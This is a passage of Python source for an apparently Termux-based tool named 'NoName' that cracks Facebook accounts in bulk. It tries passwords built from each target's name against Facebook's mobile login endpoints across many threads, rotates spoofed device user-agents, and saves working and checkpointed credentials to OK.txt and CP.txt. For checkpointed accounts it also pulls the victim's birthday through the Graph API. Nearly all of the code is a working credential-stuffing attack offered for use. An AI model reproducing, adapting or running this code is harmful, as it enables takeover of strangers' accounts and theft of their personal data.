                    Bilal_Haider_ID('\r\033[1;91m[NoName-CP] %s • %s • %s %s %s%s      '%(user,pw,day,month,year,tahun(user)))
                    wrt = '%s - %s - %s %s %s%s'% (user,pw,day,month,year,tahun(user))
                    cp.append(wrt)
                    open('CP.txt','a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
                    year  = ''
                except:
                    pass
                Bilal_Haider_ID('\r\033[1;91m[NoName-CP] %s • %s%s      '%(user,pw,tahun(user)))
                wrt = '%s - %s%s' % (user,pw,tahun(user))
                cp.append(wrt)
                open('CP.txt','a').write('%s\n' % wrt)
                break
                continue
        loop += 1
    def __mbasic__(self, user, _sempak_):
        global ok,cp,loop
        sys.stdout.write('\r\033[1;97m[ NoName ] %s/%s  \033[1;92mOK-:%s • \033[1;91mCP-:%s '%(loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in _sempak_:
            pw = pw.lower()
            try: os.mkdir('')
            except: pass
            try:
            	ua_xiaomi = Bilal_Haider('agent.txt', 'r').read()
            except (KeyError, IOError):
            	ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
            ses = requests.Session()
            headers_ = {"Host":"mbasic.facebook.com","upgrade-insecure-requests":"1","user-agent":"NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
            p = ses.get('https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F', headers=headers_).text
            dataa = {"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
            _headers = {"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
            po = ses.post("https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
            if 'c_user' in ses.cookies.get_dict():
                Bilal_Haider_ID('\r\033[1;92m[NoName-OK] %s • %s      ' % (user,pw))
                wrt = '%s - %s' % (user,pw)
                ok.append(wrt)
                open('OK.txt','a').write('%s\n' % wrt)
                break
                continue
            elif 'checkpoint' in ses.cookies.get_dict():
                try:
                    token = Bilal_Haider('token.txt').read()
                    cp_ttl = Prof_Bilal('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    Bilal_Haider_ID('\r\033[1;91m[NoName-CP] %s • %s • %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
                    wrt = '%s - %s - %s %s %s%s' % (user,pw,day,month,year,tahun(user))
                    cp.append(wrt)
                    open('CP.txt','a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
                    year  = ''
                except:
                    pass
                Bilal_Haider_ID('\r\033[1;91m[NoName-CP] %s • %s%s      ' % (user,pw,tahun(user)))
                wrt = '%s - %s%s'%(user,pw,tahun(user))
                cp.append(wrt)
                open('CP.txt','a').write('%s\n' % wrt)
                break
                continue
        loop += 1
    def __mfb__(self, user, _sempak_):
        global ok,cp,loop
        sys.stdout.write('\r\033[1;97m[ NoName ] %s/%s  \033[1;92mOK-:%s • \033[1;91mCP-:%s'%(loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in _sempak_:
            pw = pw.lower()
            try: os.mkdir('')
            except: pass
            try:
            	ua_xiaomi = Bilal_Haider('agent.txt', 'r').read()
            except (KeyError, IOError):
            	ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
            ses = requests.Session()
            headers_ = {"Host":"m.facebook.com","upgrade-insecure-requests":"1","user-agent":ua_xiaomi,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
            p = ses.get('https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F', headers=headers_).text
            dataa = {"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
            _headers = {"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
            po = ses.post("https://m.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
            if 'c_user' in ses.cookies.get_dict():
                Bilal_Haider_ID('\r\033[1;92m[NoName-OK] %s • %s      '%(user,pw))
                wrt = '%s - %s - %s' % (user,pw)
                ok.append(wrt)
                open('OK.txt','a').write('%s\n' % wrt)
                break
                continue
            elif 'checkpoint' in ses.cookies.get_dict():
                try:
                    token = Bilal_Haider('token.txt').read()
                    cp_ttl = Prof_Bilal('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    Bilal_Haider_ID('\r\033[1;91m[NoName-CP] %s • %s • %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
                    wrt = '%s - %s - %s %s %s'%(user,pw,day,month,year)
                    cp.append(wrt)
                    open('CP.txt','a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
                    year  = ''
                except:
                    pass
                Bilal_Haider_ID('\r\033[1;91m[NoName-CP] %s • %s%s      ' % (user,pw,tahun(user)))
                wrt = '%s - %s%s'%(user,pw,tahun(user))
                cp.append(wrt)
                open('CP.txt','a').write('%s\n' % wrt)
                break
                continue
        loop += 1
    def __pler__(self):
        yan = input('\n[•] Choose : ')
        if yan == '':
            Bilal_Haider_ID('\nJangan Kosong')
            exit()
        elif yan in ('1', '01'):
            Bilal_Haider_ID('\n[•] Result OK saved to OK.txt')
            Bilal_Haider_ID('[•] Result CP saved to CP.txt')
            Bilal_Haider_ID('\n\tCrack Processing...\n')
            Bilal_Haider_ID('\n\tCrack Processing...\n\n');logo()
            with ThreadPoolExecutor(max_workers=35) as (_ngentot_gratis_):
            	for yntkts in self.id:
                    try:
                        uid, name = yntkts.split('|')
                        xz = name.split(' ')
                        if len(xz) == 1:
                        	pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        elif len(xz) == 2:
                        	pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        elif len(xz) == 3:
                        	pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        elif len(xz) == 4:
                        	pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        else:
                        	pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        _ngentot_gratis_.submit(self.__api__, uid, pwx)
                    except:
                        pass
            os.remove(self.apk)
            hasil(ok,cp)
        elif yan in ('2', '02'):
            Bilal_Haider_ID('\n[•] Result OK saved to OK.txt')
            Bilal_Haider_ID('[•] Result CP saved to CP.txt')
            Bilal_Haider_ID('\n\tCrack Processing...\n')
            Bilal_Haider_ID('\n\tCrack Processing...\n\n');logo()
            with ThreadPoolExecutor(max_workers=25) as (_ngentot_gratis_):
            	for yntkts in self.id:
                    try:
                        uid, name = yntkts.split('|')
                        xz = name.split(' ')
                        if len(xz) == 1:
                        	pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", xz[0]+"1234"]
                        elif len(xz) == 2:
                        	pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", xz[0]+"1234"]
                        elif len(xz) == 3:
                        	pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", xz[0]+"1234"]
                        elif len(xz) == 4:
                        	pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", xz[0]+"1234"]
                        else:
                        	pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345", xz[0]+"1234"]
                        _ngentot_gratis_.submit(self.__mbasic__, uid, pwx)
                    except:
                        pass
            os.remove(self.apk)
            hasil(ok,cp)
        elif yan in ('3', '03'):
            #Bilal_Haider_ID('\n[•] Result OK saved to OK.txt')
            #Bilal_Haider_ID('[•] Result CP saved to CP.txt')
            #Bilal_Haider_ID('\n\tCrack Processing...\n')
            Bilal_Haider_ID('\n\tCrack Processing...\n\n');logo()
            with ThreadPoolExecutor(max_workers=20) as (_ngentot_gratis_):
            	for yntkts in self.id:
                    try:
                        uid, name = yntkts.split('|')
                        xz = name.split(' ')
                        if len(xz) == 1:
                        	pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        elif len(xz) == 2:
                        	pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        elif len(xz) == 3:
                        	pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        elif len(xz) == 4:
                        	pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        else:
                        	pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        _ngentot_gratis_.submit(self.__mfb__, uid, pwx)
                    except:
                        pass
            os.remove(self.apk)
            hasil(ok,cp)
        else:
            Bilal_Haider_ID('\nSalah')
            time.sleep(1)
            self.__pler__()
def tahun(fx):
    if len(fx)==15:
        if fx[:10] in ['1000000000']       :tahunz = ' - 2009'
        elif fx[:9] in ['100000000']       :tahunz = ' - 2009'
        elif fx[:8] in ['10000000']        :tahunz = ' - 2009'
        elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = ' - 2009'
        elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = ' - 2010'
        elif fx[:6] in ['100001']          :tahunz = ' - 2010/2011'
        elif fx[:6] in ['100002','100003'] :tahunz = ' - 2011/2012'
        elif fx[:6] in ['100004']          :tahunz = ' - 2012/2013'
        elif fx[:6] in ['100005','100006'] :tahunz = ' - 2013/2014'
        elif fx[:6] in ['100007','100008'] :tahunz = ' - 2014/2015'
        elif fx[:6] in ['100009']          :tahunz = ' - 2015'
        elif fx[:5] in ['10001']           :tahunz = ' - 2015/2016'
        elif fx[:5] in ['10002']           :tahunz = ' - 2016/2017'
        elif fx[:5] in ['10003']           :tahunz = ' - 2018/2019'
        elif fx[:5] in ['10004']           :tahunz = ' - 2019/2020'
        elif fx[:5] in ['10005']           :tahunz = ' - 2020'
        elif fx[:5] in ['10006','10007','10008']:tahunz = ' - 2021'
        else:tahunz=''
    elif len(fx) in [9,10]:
        tahunz = ' - 2008/2009'
    elif len(fx)==8:
        tahunz = ' - 2007/2008'
    elif len(fx)==7:
        tahunz = ' - 2006/2007'
    else:tahunz=''
    return tahunz
if __name__=='__main__':
	os.system("git pull")
	help()
vers = ''
seer = ''
wa_zong_free_pro = 'KU+1/ylT4Ra1XX5P8F4tdVpYqz1f+JQ8v4OZdXyezws=.r3h+SiVfDBmvw2hA.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'
wa_zong_free = 'KU+1/ylT4Ra1XX5P8F4tdVpYqz1f+JQ8v4OZdXyezws=.r3h+SiVfDBmvw2hA.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'
bilalid_ua_xaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
bilalid_ua_nokia   = 'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'
bilalid_ua_asus    = 'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
bilalid_ua_huawei  = 'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
bilalid_ua_vivo    = 'Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
bilalid_ua_oppo    = 'Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
bilalid_ua_samsung = 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]'
bilalid_ua_windows = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
id1 = uuid.uuid4().hex[:7].upper()
id2 = uuid.uuid4().hex[:7].upper()
id3 = uuid.uuid4().hex[:7].upper()
idx = id1 + '-' +id2 + '-' + id3
try:
	idx = open('/data/data/com.termux/files/usr/bin/.NoName.txt', 'r').read()
except (KeyError, IOError):
	id1 = uuid.uuid4().hex[:7].upper()
	id2 = uuid.uuid4().hex[:7].upper()
	id3 = uuid.uuid4().hex[:7].upper()
	idcio = id1 + '-' +id2 + '-' + id3
	skey = open('/data/data/com.termux/files/usr/bin/.NoName.txt', 'w')
	skey.write(idcio)
	skey.close()
banner = "\x1b[1;97m             d888b     .d88b.    d8888b.    \n            88' Y8b   .8P  Y8.   88  `8D    \n            88        88    88   88   88    \n            88  ooo   88    88   88   88    \n            88. ~8~   `8b  d8'   88  .8D    \n             Y888P     `Y88P'    Y8888D' \n "
linesmall = "------------------------------------------------------------"
linelarg = "------------------------------------------------------------------------"
ct = datetime.now()
n = ct.month
monthsx = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"]
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()
urls="https://business.facebook.com/business_locations"
_ses=requests.Session()
def approv():
	os.system("clear")
	idx = open('/data/data/com.termux/files/usr/bin/.NoName.txt', 'r').read()
	if idx in server:
		help()
	else:
		logo();time.sleep(0.3)
		print("[*] Sorry Bro, Your Key Is Not Approved Now ");time.sleep(0.3)
		print("[*] Copy Your Key And Send To The Tool Owner ");time.sleep(0.3)
		print("[*] Tool \x1b[1;91mNoName\x1b[1;97m Is Not Paid But Just Need Approval To Use It ");time.sleep(0.3)
		print("\n\n[*] Your Key : " + idx + "\n\n");time.sleep(0.3)
def real_time():
	from time import time
	return str(time()).split('.')[0]
current = datetime.now()
year = current.year
bu = current.month
cday = current.day
months = monthsx[nTemp]
my_date = date.today()
day = calendar.day_name[my_date.weekday()]
alldate = ("%s-%s-%s-%s"%(day, cday, months, year))
alldatex = ("%s %s %s"%(cday, months, year))
def jalan(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.05)

def jalanx(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.09)
def logo():
	time.sleep(0.5)
	os.system("clear")
	time.sleep(0.5)
	time.sleep(0.5)
	print(linesmall)
	print("")
	time.sleep(0.5)
	version = 'Last Version No Update Again'
	note = 'RIP Bilal Haider ID'
	print("   [*] Tool Name : NoName   |   [*] Tool Version : " + version )
	print("   [*] Note : " + note )
	print(linesmall)
	print("")
def help():
	logo()
	print("[*] For Facebook Menu : python3 run.py -fb ");time.sleep(0.3)
	print("[*] For Updating Tool : python3 run.py -update");time.sleep(0.3)
	print("[*] For Encoding Scripts and Methods : python3 run.py -enc");time.sleep(0.3)
	print("[*] For Decoding Scripts and Methods : python3 run.py -dec");time.sleep(0.3)
	print("[*] For Downloading TNL Files [ Free internet ] : python3 run.py -tnl ");time.sleep(0.3)
	print("[*] For Other Termux Tool : python3 run.py -tool ");time.sleep(0.3)
	print("[*] For Instagram Menu : python3 run.py -ig ");time.sleep(0.3)
	print("[*] For Tool About : python3 run.py -about ");time.sleep(0.3)
	print("[*] For Downloading Termux Basic Packages : python3 run.py -basic ");time.sleep(0.3)
	print("[*] For Other Downloading Tool : python3 run.py -other ");time.sleep(0.3)
	print("[*]  ");time.sleep(0.3)
	print("[*]  ");time.sleep(0.3)
	print("[*]  ");time.sleep(0.3)
	exit("")
def convert(cok):
	__for=(
			'datr='+cok['datr']
		)+';'+(
			'c_user='+cok['c_user']
		)+';'+(
			'fr='+cok['fr']
		)+';'+(
			'xs='+cok['xs'] )
	return __for
	
def email():
	logo()
	try:
		_agent=open('agent.txt').read()
	except:
		try:
			_agent=input("[*] Enter Your User-Agent : ")
			open("agent.txt", 'a').write(_agent)
		except:
			_agent=input("[*] Enter Your User-Agent : ")
			open("agent.txt", 'a').write(_agent)
	try:
		user=input("\n[*] Email or User ID : ")
		pw=input("[*] Account Password : ")
	except:
		user=input("\n[*] Email or User ID : ")
		pw=input("[*] Account Password : ")
	try:
		_head={
			'Host':'m.facebook.com',
				'cache-control':'max-age=0',
			'upgrade-insecure-requests':'1',
				'user-agent':_agent,
			'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
			'sec-fetch-mode':'navigate',
				'sec-fetch-user':'?1',
			'sec-fetch-dest':'document',
				'accept-encoding':'gzip, deflate',
			'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
		}
		try:
			r=_ses.get("https://m.facebook.com/", headers=_head).text.encode('utf-8')
		except:
			r=_ses.get("https://m.facebook.com/", headers=_head).text
		_head2={
			'Host':'m.facebook.com',
				'user-agent':_agent,
			'content-type':'application/x-www-form-urlencoded',
				'x-fb-lsd':re.search('name="lsd" value="(.*?)"', str(r)).group(1),
			'accept':'*/*',
				'origin':'https://m.facebook.com',
			'sec-fetch-site':'same-origin',
				'sec-fetch-mode':'cors',
			'sec-fetch-dest':'empty',
				'referer':'https://m.facebook.com/',
			'accept-encoding':'gzip, deflate',
				'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
		}
		payload={
			"fb_dtsg":re.search('{"token":"(.*?)"', str(r)).group(1).encode('utf-8'),
				"lsd":re.search('name="lsd" value="(.*?)"', str(r)).group(1),
